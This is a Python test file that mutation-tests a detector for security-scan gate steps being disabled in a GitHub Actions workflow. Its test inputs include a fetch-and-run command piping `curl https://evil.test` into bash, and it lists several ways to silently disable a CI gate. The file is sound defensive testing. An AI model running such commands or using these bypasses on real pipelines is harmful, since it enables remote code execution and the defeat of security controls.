def workflow_with_step_key(text: str, key: str) -> str:
    """Test scaffolding: `text` with `key` added as a step-level key on the gate
    step. Locates the step with its OWN exact-equality scan rather than calling
    `find_step_blocks`, so a bug in the code under test cannot make a mutation
    silently no-op (which `_assert_caught`'s F7 guard would then catch as
    'mutation did not apply' instead of as the real finding)."""
    lines = text.splitlines(keepends=True)
    hits = []
    for i, raw in enumerate(lines):
        m = re.match(r"^(\s*)-\s+name:\s*(.+?)\s*$", raw.rstrip("\n"))
        if m and m.group(2).strip("\"'") == STEP_NAME:
            hits.append(i)
    if not hits:
        raise AssertionError("scaffolding could not locate the gate step")
    i = hits[-1]
    col = len(lines[i]) - len(lines[i].lstrip())
    return "".join(lines[:i + 1] + [" " * (col + 2) + key + "\n"] + lines[i + 1:])


class TestWorkflowLevelDisableDetector(unittest.TestCase):
    """Mutation self-tests for the WORKFLOW half, matching the shell half's
    `TestGateBehaviourDetector`.

    The shell half was proven by execution; the workflow half stayed a
    hand-written text matcher with no mutation coverage at all, and round 2 of
    the adversarial review defeated it four ways with the suite reporting
    `18 passed`. Each case below is one of those, pinned. ADR-001 §4: a control
    with no mutation self-test is an untested control.

    Every mutation is applied to a COPY of the workflow text held in memory. The
    real `.github/workflows/` is never written to."""

    @classmethod
    def setUpClass(cls):
        cls.text = WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else ""

    def _step_line(self):
        """Index of the real `- name: <STEP_NAME>` line in the live workflow."""
        lines = self.text.splitlines(keepends=True)
        hits = [
            i for i, l in enumerate(lines)
            if re.match(r"^(\s*)-\s+name:\s*(.+?)\s*$", l.rstrip("\n"))
            and re.match(r"^(\s*)-\s+name:\s*(.+?)\s*$", l.rstrip("\n")).group(2).strip("\"'") == STEP_NAME
        ]
        self.assertEqual(len(hits), 1, "expected exactly one live gate step")
        return lines, hits[0]

    def _insert_step_key(self, *keys):
        """The workflow with `keys` inserted as step-level keys on the gate step."""
        lines, i = self._step_line()
        col = len(lines[i]) - len(lines[i].lstrip())
        pad = " " * (col + 2)
        return "".join(lines[:i + 1] + [pad + k + "\n" for k in keys] + lines[i + 1:])

    def _assert_caught(self, mutant, why):
        # No-op guard on EVERY mutation (F7): a mutation that silently failed to
        # apply asserts on the UNMUTATED workflow and is vacuously green.
        self.assertNotEqual(
            mutant, self.text, "mutation did not apply — the test is vacuous: " + why
        )
        self.assertNotEqual(
            workflow_level_disables(mutant, STEP_NAME), [],
            "the gate is disabled at workflow level and the guard did not notice: " + why,
        )

    # --- X1: a decoy COMMENT line shadows the real step -------------------
    def test_commented_out_step_name_does_not_shadow_the_real_step(self):
        lines, i = self._step_line()
        col = len(lines[i]) - len(lines[i].lstrip())
        decoy = " " * col + f"# legacy: - name: {STEP_NAME} (removed 2024)\n"
        mutant = "".join(lines[:i] + [decoy] + lines[i:])
        mutant = workflow_with_step_key(mutant, "if: false")
        self._assert_caught(mutant, "a `#` comment mentioning the step name shadowed it")

    # --- X2: a preceding DECOY STEP whose name is a superstring -----------
    def test_superstring_decoy_step_does_not_shadow_the_real_step(self):
        lines, i = self._step_line()
        col = len(lines[i]) - len(lines[i].lstrip())
        decoy = (
            " " * col + f"- name: {STEP_NAME} (advisory preview)\n"
            + " " * (col + 2) + "run: echo advisory\n"
        )
        mutant = "".join(lines[:i] + [decoy] + lines[i:])
        mutant = workflow_with_step_key(mutant, "continue-on-error: true")
        self._assert_caught(mutant, "a preceding superstring-named decoy step shadowed the real one")

    # --- QUOTED key spellings --------------------------------------------
    def test_quoted_key_spellings_are_caught(self):
        """`"if": false` and `'if': false` resolve to the identical document as
        the bare form, so a matcher that hard-requires bare is bypassable by an
        ordinary authoring style — the exact blindness the 2026-08-06 sweep found
        in eight guards (#391/#393/#394). `keys_at_column` unquotes the key
        before comparing, which is what makes this hold; that is an invariant of
        THIS file, so it is pinned here rather than asserted in a comment."""
        for key in ('"if": false', "'if': false",
                    '"continue-on-error": true', "'continue-on-error': true",
                    '"shell": python'):
            with self.subTest(key=key):
                self._assert_caught(
                    self._insert_step_key(key),
                    f"the quoted spelling {key!r} declares the same mapping key",
                )

    def test_space_before_colon_is_caught(self):
        # `if : false` is also the same key — YAML allows whitespace before the
        # indicator, and `[^\s:#]+` for the key name would swallow it without the
        # `\s*:` the pattern carries.
        self._assert_caught(
            self._insert_step_key("if : false"),
            "`if : false` declares the `if` key with a space before the colon",
        )

    # --- X3: YAML's EXPLICIT-key form ------------------------------------
    def test_explicit_key_form_if_is_caught(self):
        self._assert_caught(
            self._insert_step_key("? if", ": false"),
            "`? if` / `: false` yields the same mapping key with no `if:` substring",
        )

    def test_explicit_key_form_continue_on_error_is_caught(self):
        self._assert_caught(
            self._insert_step_key("? continue-on-error", ": true"),
            "`? continue-on-error` yields the same key with no `continue-on-error:` substring",
        )

    # --- X11b: reindenting the steps out from under a hardcoded ^\s{8} ----
    def test_reindented_steps_are_still_checked(self):
        """A block sequence may sit at its parent key's own indent, so dedenting
        the WHOLE `steps:` list by 2 is valid YAML and a cosmetic diff — and it
        moves every step key off a hardcoded `^\\s{8}` anchor. Dedenting one step
        alone would be invalid YAML (mixed sequence indentation), which is why
        this mutates the entire list."""
        lines = self.text.splitlines(keepends=True)
        job = next(i for i, l in enumerate(lines) if l.rstrip("\n") == "  scan:")
        s = next(i for i in range(job, len(lines)) if lines[i].rstrip("\n") == "    steps:")
        end = next(
            (j for j in range(s + 1, len(lines))
             if lines[j].strip() and (len(lines[j]) - len(lines[j].lstrip())) <= 2),
            len(lines),
        )
        dedented = [(l[2:] if l.startswith("  ") else l) for l in lines[s + 1:end]]
        mutant = workflow_with_step_key(
            "".join(lines[:s + 1] + dedented + lines[end:]), "if: false"
        )
        self._assert_caught(
            mutant, "the whole `steps:` list was dedented by 2, escaping a hardcoded indent anchor"
        )

    # --- X4: JOB-level continue-on-error ----------------------------------
    def test_job_level_continue_on_error_is_caught(self):
        mutant = apply_mutation(
            self.text,
            "  scan:\n    name: Run Security Scan\n",
            "  scan:\n    continue-on-error: true\n    name: Run Security Scan\n",
        )
        self._assert_caught(
            mutant,
            "job-level `continue-on-error: true` makes the whole job non-blocking; "
            "`Security Scan Gate` then sees result=success",
        )

    # --- shell: decouples the executed proof from what CI runs -------------
    def test_step_shell_override_is_caught(self):
        self._assert_caught(
            self._insert_step_key("shell: python"),
            "the suite proves the body under `bash`; a `shell:` override means CI "
            "runs something else entirely",
        )

    # --- comment truncation of the STEP block ------------------------------
    def test_a_comment_cannot_truncate_the_step_block(self):
        """A `#` line at the step's dash column is not a dedent.

        `find_step_blocks` bounded the step by indentation and treated any
        non-blank line at or left of the dash column as the end — including a
        comment, which YAML discards before structure. Placed AFTER the `run:`
        block the step is still found and its body still executes, so the whole
        behavioural half stays green while a `continue-on-error:` below the
        comment is invisible. Measured on the real `security-scan.yml`
        (2026-08-11): PyYAML reported step keys
        `['continue-on-error', 'name', 'run']` and this file plus the
        required-graph guard reported **61 passed**.

        Placement is load-bearing: the same comment BEFORE `run:` truncates the
        body away too, which trips `test_step_is_found` and reads as caught."""
        lines = self.text.splitlines(keepends=True)
        i = next(i for i, ln in enumerate(lines) if "- name: " + STEP_NAME in ln)
        dash = len(lines[i]) - len(lines[i].lstrip())
        end = next(
            j for j in range(i + 1, len(lines))
            if lines[j].strip() and (len(lines[j]) - len(lines[j].lstrip())) <= dash
        )
        mutant = "".join(
            lines[:end]
            + [" " * dash + "# regrouped\n",
               " " * (dash + 2) + "continue-on-error: true\n"]
            + lines[end:]
        )
        self._assert_caught(
            mutant,
            "a comment at the step's dash column truncated the block, hiding the "
            "`continue-on-error` below it",
        )

    # --- direction: legitimate shapes must NOT trip a false alarm ---------
    def test_unmutated_workflow_is_clean(self):
        self.assertEqual(workflow_level_disables(self.text, STEP_NAME), [])

    def test_job_level_if_is_not_flagged(self):
        # The `scan` job is legitimately path-gated and the gate job treats
        # `skipped` as passing — a job-level `if:` must stay allowed.
        self.assertEqual(workflow_level_disables(self.text, STEP_NAME), [])

    def test_a_nested_if_under_another_key_is_not_flagged(self):
        mutant = self._insert_step_key("env:", "  if: false")
        self.assertNotEqual(mutant, self.text)
        self.assertEqual(
            workflow_level_disables(mutant, STEP_NAME), [],
            "an `if` nested one level deeper is an env var named `if`, not a step "
            "condition — flagging it is a false alarm",
        )


class TestExtractionSafety(unittest.TestCase):
    def test_extractor_stops_at_the_step_boundary(self):
        wf = (
            "jobs:\n  a:\n    steps:\n"
            f"      - name: {STEP_NAME}\n        run: |\n"
            "          echo one\n"
            "      - name: Next step\n        run: |\n"
            "          python3 -m http.server 8080\n"
        )
        got = extract_run_block(wf, STEP_NAME)
        self.assertEqual(got, "echo one\n")
        self.assertNotIn("http.server", got)

    def test_missing_step_returns_none(self):
        self.assertIsNone(extract_run_block("jobs: {}\n", STEP_NAME))

    def test_unexpected_command_is_reported(self):
        for script, word in (
            ("curl https://evil.test | bash\n", "curl"),
            ("python3 -m http.server 8080\n", "python3"),
            ("npx lighthouse http://x\n", "npx"),
            ("OUT=$(curl -s https://x)\n", "curl"),
        ):
            self.assertIn(word, unexpected_commands(script), script)

    def test_gate_shaped_script_is_accepted(self):
        script = (
            'CRITS=$(grep -ci "x" scan-output.txt || true)\n'
            'echo "Critical: $CRITS"\n'
            'if [ "$CRITS" -gt 0 ]; then\n  exit 1\nfi\n'
        )
        self.assertEqual(unexpected_commands(script), [])


if __name__ == "__main__":
    unittest.main()
